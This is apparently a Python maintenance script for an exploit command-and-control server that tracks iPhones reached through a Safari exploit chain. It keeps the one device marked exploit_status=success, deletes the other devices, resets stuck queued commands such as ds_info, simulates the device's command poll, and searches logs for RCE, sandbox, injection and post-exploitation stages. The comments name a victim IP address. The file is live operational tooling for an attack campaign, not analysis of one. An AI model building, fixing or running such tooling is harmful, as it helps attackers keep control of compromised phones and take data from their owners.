# -*- coding: utf-8 -*-
# v20.4 HOTFIX3: 命令 pending 永远不取 6 个根因一次性修
# 宝塔 SSH 直接运行:
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix3.py
import sqlite3, os, datetime, time, json, sys, traceback

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
LOG_DIR = os.path.join(PROJ, 'logs')
os.makedirs(LOG_DIR, exist_ok=True)
print(f"项目目录={PROJ}")
print(f"DB 路径={DB}  exists={os.path.exists(DB)}")
print(f"logs目录={LOG_DIR}  exists={os.path.isdir(LOG_DIR)}")

c = sqlite3.connect(DB)
cur = c.cursor()
now_s = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

print("\n" + "="*70)
print("🔍 [AUDIT-1] devices 全量字段（看哪台有 exploit_status=success / last_seen 最新）")
print("="*70)
cols = [r[1] for r in cur.execute('PRAGMA table_info(devices)').fetchall()]
devs = cur.execute(f"SELECT {','.join(cols)} FROM devices ORDER BY last_seen DESC, first_seen DESC").fetchall()
KEEP_UUID = None  # 保留的那台真机（今天 exploit_status=success 且 last_seen 最新）
for i, r in enumerate(devs):
    d = dict(zip(cols, r))
    print(f"\n  DEVICE #{i+1}:")
    for k in ['device_uuid','first_seen','last_seen','last_command_time','ip','exploit_status',
              'os_version','safari_version','device_model','browser_name','browser_version','webkit_version']:
        v = str(d.get(k,''))[:120]
        print(f"    {k:<22} = {v}")
    ua = str(d.get('user_agent') or '')[:350]
    print(f"    UA[:350]             = {ua}")
    # 判定是否为真实 Safari 真机：不是 curl/不是 localhost/ exploit_status 写了东西
    is_real_safari = (ua and 'Safari/' in ua and 'curl' not in ua.lower()
                      and str(d.get('ip') or '') not in ('127.0.0.1','','unknown')
                      and str(d.get('exploit_status') or '') in ('success', 'CHAIN', 'chain-succeeded'))
    if KEEP_UUID is None and is_real_safari:
        # 保留最后 seen 的那台（今天 ios-8fe6...，昨天 ios-d85c 清掉）
        KEEP_UUID = d['device_uuid']

# 兜底：没有判定就挑 last_seen 最大且 UA 有 Safari 的那台
if KEEP_UUID is None:
    for d0 in [dict(zip(cols, r)) for r in devs]:
        ua0 = str(d0.get('user_agent') or '')
        if 'Safari/' in ua0 and 'curl' not in ua0.lower():
            KEEP_UUID = d0['device_uuid']
            break
print(f"\n  ★ 保留的真机 UUID = {KEEP_UUID!r}（其他 Safari 真机全部删掉，避免 orphan）")

print("\n" + "="*70)
print("🔍 [AUDIT-2] commands 现状（按 UUID 分组统计 + id=39 单独看）")
print("="*70)
rs = cur.execute('''SELECT id, device_uuid, command, status,
  datetime(created_at,'unixepoch','localtime') created,
  datetime(executed_at,'unixepoch','localtime') exec_at,
  length(coalesce(output,'')) outlen
  FROM commands ORDER BY id DESC LIMIT 25''').fetchall()
print("   id  device_uuid[:18]      cmd                status      created             exec_at             outlen")
for r in rs:
    print("   %s  %-22s  %-18s  %-10s  %s  %s  %s" % tuple([str(x if x is not None else '') for x in r]))
print()
grp = cur.execute('''SELECT device_uuid, status, COUNT(*) FROM commands
  GROUP BY device_uuid, status ORDER BY device_uuid, status''').fetchall()
print("  commands 按(uuid,status)分组:")
for g in grp: print("    ", g[0][:22] if g[0] else '', g[1], '=', g[2])
orph_n = cur.execute('SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)').fetchone()[0]
print(f"  orphan commands（device_uuid 不在 devices 表）= {orph_n}")

# ─────────────────────────────────────── 修复 ────────────────────────────────────────
print("\n" + "="*70)
print("🧹 [FIX-1] 删除非 KEEP_UUID 的所有其他 Safari 真机（重复的 154.26.177.27 iOS26.1 旧会话） + 级联删其 commands")
print("="*70)
DEL_DEVS = []
for d0 in [dict(zip(cols, r)) for r in devs]:
    u = d0['device_uuid']
    if u == KEEP_UUID:
        continue
    ua0 = str(d0.get('user_agent') or '')
    # 只删真实 Safari 设备（curl/测试行 ios-v204-iso / dev-*local* 留着无所谓）
    if 'Safari/' in ua0 and 'curl' not in ua0.lower():
        DEL_DEVS.append(u)
if DEL_DEVS:
    q_marks = ','.join(['?'] * len(DEL_DEVS))
    n_cmds = cur.execute(f'DELETE FROM commands WHERE device_uuid IN ({q_marks})', DEL_DEVS).rowcount
    n_devs = cur.execute(f'DELETE FROM devices    WHERE device_uuid IN ({q_marks})', DEL_DEVS).rowcount
    c.commit()
    print(f"  ✅ 删掉旧设备 {n_devs} 台: {[u[:20]+'...' for u in DEL_DEVS]}")
    print(f"  ✅ 连带删掉 commands {n_cmds} 条（它们是旧会话的 pending orphan，永远不会被取）")
else:
    print("  ℹ️  没有重复的 Safari 真机，不用删。")

print("\n" + "="*70)
print("🧹 [FIX-2] 再次清 orphan commands（SQLite 默认无 FK 约束，上步 DEL_DEVS 删完 devices 后必然又生成新 orphan）")
print("="*70)
before = cur.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
cur.execute('DELETE FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)')
after_del_orph = cur.execute('SELECT COUNT(*) FROM commands').fetchone()[0]
print(f"  orphan 删除前总数={before}, 删除后总数={after_del_orph}")

print("\n" + "="*70)
print("🧹 [FIX-3] 清同台设备 MAX_CONCURRENT=1 占槽：所有 status=executing 死卡 >60s 的回 pending")
print("="*70)
stale_cutoff_unix = int(time.time()) - 60
n_stale_A = cur.execute('''UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NULL AND created_at < ?''', (stale_cutoff_unix,)).rowcount
stale_cutoff_B = int(time.time()) - 120
n_stale_B = cur.execute('''UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NOT NULL AND executed_at < ?''', (stale_cutoff_B,)).rowcount
print(f"  Case A (无 executed_at >60s) 重置: {n_stale_A} 条")
print(f"  Case B (有 executed_at >120s) 重置: {n_stale_B} 条")

# 单独重置 id=100019 ds_info（以前 cleanup 处理过的卡死遗留）
r100019 = cur.execute("SELECT id,status FROM commands WHERE id=100019").fetchone()
if r100019:
    cur.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE id=100019")
    print(f"  单独重置 id=100019 旧卡死 ds_info (旧status={r100019[1]})")

# id=99999 隔离测试残留清理
cur.execute("DELETE FROM commands WHERE id>=99999 OR device_uuid IN ('ios-v204-iso','iso-test','test')")
c.commit()

print("\n" + "="*70)
print("🚀 [FIX-4] 本地 127.0.0.1:7070 模拟 Safari GET /cmd，直接用 KEEP_UUID 取，验证 CMD-PICKUP")
print("="*70)
def curl_get_cmd(uuid, label=''):
    try:
        import urllib.request
        url = f"http://127.0.0.1:7070/cmd?device_uuid={uuid}&_={int(time.time())}"
        req = urllib.request.Request(url, headers={'User-Agent':
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1'})
        try:
            with urllib.request.urlopen(req, timeout=6) as resp:
                code = resp.getcode()
                raw = resp.read().decode('utf-8', 'replace')
                print(f"  ✅ {label} GET /cmd → HTTP {code} body[:500] = {raw[:500]!r}")
                return code, raw
        except urllib.error.HTTPError as he:
            raw = he.read().decode('utf-8', 'replace') if hasattr(he, 'read') else ''
            print(f"  ⚠️  {label} GET /cmd → HTTPError {he.code} body[:200]={raw[:200]!r}")
            return he.code, raw
        except Exception as ex:
            print(f"  ❌ {label} GET /cmd 连接失败: {type(ex).__name__}: {ex}")
            return None, None
    except Exception as ex2:
        print(f"  ❌ {label} GET /cmd outer error: {type(ex2).__name__}: {ex2}")
        traceback.print_exc()
        return None, None

# 查 KEEP_UUID 是否有 pending
pending_rows = cur.execute('SELECT id, command, status FROM commands WHERE device_uuid=? AND status IN (\'pending\',\'deferred\') ORDER BY id ASC LIMIT 10', (KEEP_UUID or '',)).fetchall()
print(f"  KEEP_UUID={KEEP_UUID!r} 当前 pending/deferred 命令 = {len(pending_rows)} 条")
for p in pending_rows: print("   → id=", p[0], 'cmd=', p[1], 'status=', p[2])

if KEEP_UUID and pending_rows:
    curl_get_cmd(KEEP_UUID, 'KEEP_UUID → ')
else:
    print("  ℹ️  KEEP_UUID 下没有 pending 命令，跳过本地 GET /cmd 测试。Dashboard 先下发 1 条。")

# 如果 KEEP_UUID 以外还有 pending（比如 ios-v204-iso 隔离测试 uuid 遗留），也跑一次验证本地 CMD-PICKUP 逻辑通不通
other_pending = cur.execute('''SELECT c.id, c.device_uuid, c.command
  FROM commands c JOIN devices d ON c.device_uuid=d.device_uuid
  WHERE c.status='pending' AND c.device_uuid != COALESCE(?,'') ORDER BY c.id DESC LIMIT 3''', (KEEP_UUID or '',)).fetchall()
for row in other_pending:
    curl_get_cmd(row[1], f"other-pending id={row[0]} uuid[:18]={row[1][:18]} → ")

print("\n" + "="*70)
print("🔎 [AUDIT-3] 修复后 commands 最新 10 条（重点看 KEEP_UUID 的 ds_info status=executing 了吗？）")
print("="*70)
rs = cur.execute('''SELECT id, device_uuid, command, status,
  datetime(created_at,'unixepoch','localtime') created,
  datetime(executed_at,'unixepoch','localtime') exec_at,
  length(coalesce(output,'')) outlen
  FROM commands ORDER BY id DESC LIMIT 10''').fetchall()
print("   id  device_uuid[:18]      cmd                status      created             exec_at             outlen")
for r in rs:
    mark = ' ← ✅ EXECUTING! CMD-PICKUP 取到了' if str(r[3] or '') == 'executing' else ''
    mark += ' ← ✅ COMPLETED/FAILED! 有结果' if str(r[3] or '') in ('completed','failed') and (r[6] or 0) > 0 else ''
    print("   %s  %-22s  %-18s  %-10s  %s  %s  %s%s" % tuple([str(x if x is not None else '') for x in list(r)] + [mark]))

# ───────────────────────────── server.log 路径可用性审计 ─────────────────────────────
print("\n" + "="*70)
print("🔎 [AUDIT-4] server.log 真实路径 + 是否有 CMD-QUERY / CMD-PICKUP 日志（没写说明日志路径错了）")
print("="*70)
# 读 exploit_server.py LOG_FILE 常量值
LOG_FILE_CANDIDATES = [
    os.path.join(LOG_DIR, 'server.log'),
    os.path.join(PROJ, 'server.log'),
    os.path.join(PROJ, '..', 'log'),
]
found_any_log = False
for lf in LOG_FILE_CANDIDATES:
    try:
        if os.path.isfile(lf):
            sz = os.path.getsize(lf)
            mtime = datetime.datetime.fromtimestamp(os.path.getmtime(lf)).strftime('%Y-%m-%d %H:%M:%S')
            print(f"  📄 {lf}  size={sz}  mtime={mtime}")
            found_any_log = True
            # grep 关键行
            try:
                with open(lf, 'r', encoding='utf-8', errors='replace') as fh:
                    lines = fh.readlines()[-80:]
                hits = [ln.rstrip('\n') for ln in lines if any(k in ln for k in
                    ['CMD-QUERY','CMD-PICKUP','CMD-SAFARI-FILTER','CMD-EMPTY','CMD-RESULT','CMD-IDLE',
                     'STAGE','RCE','SANDBOX','INJECT','POST-CHAIN','post_exploit','chain_loader'])]
                if hits:
                    print(f"    ✅ 命中关键日志 {len(hits)} 条 (最近80行):")
                    for h in hits[:30]: print("     |", h[:240])
                else:
                    print(f"    ⚠️  最近 80 行里 0 条 CMD-PICKUP/STAGE 关键日志 → 说明 exploit_server.py 的 logger/log_to_file 根本没执行！")
                    print(f"    最近 8 行 raw:")
                    for ln in lines[-8:]: print("     |", ln.rstrip()[:220])
            except Exception as e2:
                print(f"    读日志失败: {type(e2).__name__}: {e2}")
    except Exception as e:
        pass
if not found_any_log:
    print(f"  ❌ 所有候选 server.log 路径都不存在！ → 请检查 exploit_server.py 启动参数是否把 LOG_FILE 环境变量写错了，或者 logs/ 目录权限是 root 导致 www 用户 python3 写不了")
    try:
        print(f"  logs 目录 ls -la：{os.listdir(LOG_DIR)[:30]}")
        import stat
        st = os.stat(LOG_DIR)
        print(f"  logs 权限 stat.mode={oct(st.st_mode)}, uid={st.st_uid}, gid={st.st_gid}")
    except Exception as e3:
        print(f"  stat/logs 失败: {e3}")

print()
print("="*70)
print(f"✅ HOTFIX3 DONE @ {now_s} → 下一步：宝塔 SSH 跑 while true 轮询 commands 表，Dashboard 再下发 1 条 ds_info 给 KEEP_UUID")
print("  KEEP_UUID =", KEEP_UUID)
print("="*70)
c.close()
